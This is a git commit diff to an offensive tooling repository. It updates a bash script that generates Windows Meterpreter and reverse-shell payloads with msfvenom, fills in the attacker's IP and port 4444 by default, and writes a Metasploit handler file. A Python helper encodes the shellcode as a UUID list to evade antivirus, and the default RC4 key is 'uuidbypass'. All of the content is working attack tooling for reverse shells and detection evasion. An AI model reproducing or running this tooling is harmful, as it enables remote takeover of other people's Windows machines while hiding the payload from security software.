0e9c1c9e9f0d55ed1bdc90071f140689023f1c77
whydee86 <43274863+whydee86@users.noreply.github.com>
2021-02-18 16:08:31 +0200

    fixing

--- BuildShellCode.sh
+++ BuildShellCode.sh
@@ -1,8 +1,20 @@
 #!/bin/bash
-PAYLOAD_HTTPS="windows/x64/meterpreter/reverse_https"
-PAYLOAD_RC4="windows/x64/meterpreter/reverse_tcp_rc4"
-PAYLOAD_SHELL="windows/x64/shell/reverse_tcp"
-PAYLOAD_SIMPLE_M="windows/x64/meterpreter/reverse_tcp"
+
+#Defualt configuration
+Defualt_IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
+Defualt_Port="4444"
+
+#Payload list
+#32 bit
+PAYLOAD_HTTPS="windows/meterpreter/reverse_https"
+PAYLOAD_RC4="windows/meterpreter/reverse_tcp_rc4"
+PAYLOAD_SHELL="windows/shell/reverse_tcp"
+PAYLOAD_SIMPLE_M="windows/meterpreter/reverse_tcp"
+#64 bit
+PAYLOAD_HTTPS_64="windows/x64/meterpreter/reverse_https"
+PAYLOAD_RC4_64="windows/x64/meterpreter/reverse_tcp_rc4"
+PAYLOAD_SHELL_64="windows/x64/shell/reverse_tcp"
+PAYLOAD_SIMPLE_M_64="windows/x64/meterpreter/reverse_tcp"
 
 #Check if root
 if [[ $EUID -ne 0 ]]; then
@@ -10,7 +22,7 @@ if [[ $EUID -ne 0 ]]; then
    exit 1
 fi
 
-#Clean workspace beafore start working
+#Clean workspace before start working
 echo -e "\033[32mCleaning your workspace...\033[0m"
 SC=shellcode.bin
 if test -f "$SC"; then
@@ -23,71 +35,122 @@ if test -f "$MP"; then
 fi
 
 
-#build automation for shellcode
+#build the shellcode
+echo -e "\033[34mDefault IP:\033[1m" $Defualt_IP "\033[0m"
+echo -e "\033[34mdefault Port:\033[1m" $Defualt_Port "\033[0m"
 echo "Let's Build your shellcode"
-
 echo "what is your ip address(kali ip)?"
-read -p "ip:" IP
-echo nice ip: $IP
-read -p "Now, what is your port that you want to listen to:" PORT
-echo "Nice one, My favorite!"
+echo -e "\033[2myou can use defaults by press \033[1menter\033[0m"
 
-PS3='Please enter your choice: '
-payloads=($PAYLOAD_HTTPS $PAYLOAD_RC4 $PAYLOAD_SHELL $PAYLOAD_SIMPLE_M)
+read -p "IP:" IP
+if [[ -z "$IP" ]]; then
+    #echo $IP
+    IP=$Defualt_IP
+fi
+echo -e "Nice ip address:\033[1m" $IP "\033[0m"
+
+echo "Now, what is your port that you want to listen to?"
+read -p "Port:" PORT 
+if [[ -z "$PORT" ]];  then
+    PORT=$Defualt_Port
+fi
+echo -e "Nice one, My favorite!\033[1m:" $PORT "\033[0m"
+
+PS3='Please choose your payload: '
+payloads=($PAYLOAD_HTTPS $PAYLOAD_RC4 $PAYLOAD_SHELL $PAYLOAD_SIMPLE_M $PAYLOAD_HTTPS_64 $PAYLOAD_RC4_64 $PAYLOAD_SHELL_64 $PAYLOAD_SIMPLE_M_64)
 select opt in "${payloads[@]}"
 do
-    case $opt in
+    case $opt in  
         $PAYLOAD_HTTPS)
             echo "you chose: $PAYLOAD_HTTPS"
+            PAYLOAD=$PAYLOAD_HTTPS
+            ARCH="x86"
+            break
             ;;
         $PAYLOAD_RC4)
             echo "you chose: $PAYLOAD_RC4"
-            read -p "please enter rc4 password:" IP
+            read -p "please enter rc4 password:" RC4PASSWORD
+            PAYLOAD=$PAYLOAD_RC4
+            ARCH="x86"
+            break
             ;;
         $PAYLOAD_SHELL)
             echo "you chose: $PAYLOAD_SHELL"
+            PAYLOAD=$PAYLOAD_SHEL
+            ARCH="x86"
+            break
             ;;
         $PAYLOAD_SIMPLE_M)
             echo "you chose: $PAYLOAD_SIMPLE_M"
-            PAYLOAD = $REPLY
+            PAYLOAD=$PAYLOAD_SIMPLE_M
+            ARCH="x86"
+            break
+            ;;
+        $PAYLOAD_HTTPS_64)
+            echo "you chose: $PAYLOAD_HTTPS_64"
+            PAYLOAD=$PAYLOAD_HTTPS_64
+            ARCH="x64"
+            break
+            ;;
+        $PAYLOAD_RC4_64)
+            echo "you chose: $PAYLOAD_RC4_64"
+            read -p "please enter rc4 password:" RC4PASSWORD
+            PAYLOAD=$PAYLOAD_RC4_64
+            ARCH="x64"
+            break
+            ;;
+        $PAYLOAD_SHELL_64)
+            echo "you chose: $PAYLOAD_SHELL_64"
+            PAYLOAD=$PAYLOAD_SHELL_64
+            ARCH="x64"
+            break
+            ;;
+        $PAYLOAD_SIMPLE_M_64)
+            echo "you chose: $PAYLOAD_SIMPLE_M_64"
+            PAYLOAD=$PAYLOAD_SIMPLE_M_64
+            ARCH="x64"
+            break
             ;;
         *) echo "invalid option $REPLY";;
     esac
 done
 
-echo -e "\033[32mStart building your shellcode...\033[0m"
 
-#sudo msfvenom RC4PASSWORD=apolo11 -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=$IP LPORT=$PORT -e x64/xor/dynamic -f python -b "x00" > shellcode.bin #> /dev/null 2>&1
-sudo msfvenom -a x64 --platform windows -p $PAYLOAD LHOST=$IP LPORT=$PORT -e x64/xor/dynamic -f python -b "x00" > shellcode.py
-
-
-echo -e "\033[32mYour shellcode is in shellcode.bin\033[0m"
-sleep 2
-
-
+#Genrate the shellcode
+if [[ "$PAYLOAD" == "$PAYLOAD_RC4"  || $PAYLOAD == "$PAYLOAD_RC4_64" ]]; then 
+    if [[ -z $RC4PASSWORD ]]; then
+        RC4PASSWORD="uuidbypass"
+    fi
+    echo -e "\033[32mStart building your shellcode...\033[0m"
+    sudo msfvenom RC4PASSWORD=$RC4PASSWORD -a $ARCH --platform windows -p $PAYLOAD LHOST=$IP LPORT=$PORT  -f python -b "x00" > shellcode.bin
+    echo -e "\033[32mYour shellcode is in shellcode.bin\033[0m"
+else
+    echo -e "\033[32mStart building your shellcode...\033[0m"
+    sudo msfvenom -a $ARCH --platform windows -p $PAYLOAD LHOST=$IP LPORT=$PORT -f python -b "x00" > shellcode.py
+    echo -e "\033[32mYour shellcode is in shellcode.bin\033[0m"
+fi
 
 #Check if user wants to convert shellcode to uuid
 read -r -p "Do you want to covert your shellcode to uuid structure? [y/N] " response
 if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
 then
     echo -e "\033[32mConverting is running...\033[0m"
-    sleep 1
     sudo python3 Shellcode2UUID.py
 else
     echo -e "\033[32mOk, it's fine too\033[0m"
-    exit 1
 fi
-
-
 
 #Create automation for meterpreter shell
 echo -e "\033[32mNow, Let's build your meterpreter shell automation\033[0m"
-sleep 1
 sudo touch meterpreter.rc
 echo use exploit/multi/handler >> meterpreter.rc
 echo set PAYLOAD $PAYLOAD >> meterpreter.rc
 echo set LHOST $IP >> meterpreter.rc
 echo set LPORT $PORT >> meterpreter.rc
+if [[ $PAYLOAD == $PAYLOAD_RC4 || $PAYLOAD == $PAYLOAD_RC4_64 ]]; then
+    echo "setting password"
+    echo set RC4PASSWORD $RC4PASSWORD >> meterpreter.rc
+fi
 echo set ExitOnSession false >> meterpreter.rc
 echo exploit -j -z >> meterpreter.rc
 echo "Output:"
@@ -102,5 +165,3 @@ else
     echo -e "\033[31mBye, Have a great time\033[0m"
     exit 1
 fi
-
-
--- Shellcode2UUID.py
+++ Shellcode2UUID.py
@@ -6,13 +6,8 @@ def convertToUUID(shellcode):
     output = "UUID_list.txt"
     write_file = open(output,"w")
     if len(shellcode) % 16 != 0:
-        print("[-] Shellcode's length not multiplies of 16 bytes")
-        print("[-] Adding nullbytes at the end of shellcode, this might break your shellcode.")
-        print("\n[*] Modified shellcode length: ", len(shellcode)+(16-(len(shellcode)%16)))
-
         addNullbyte =  b"\x00" * (16-(len(shellcode)%16))
         shellcode += addNullbyte 
-
     uuids = []
     for i in range(0, len(shellcode), 16):
         uuidString = str(uuid.UUID(bytes_le=shellcode[i:i+16]))
@@ -23,6 +18,5 @@ def convertToUUID(shellcode):
 
 def main():
     buf = shellcode.buf
-    uuids = convertToUUID(buf)
-    #print(*uuids, sep=",\n")
+    convertToUUID(buf)
 main()
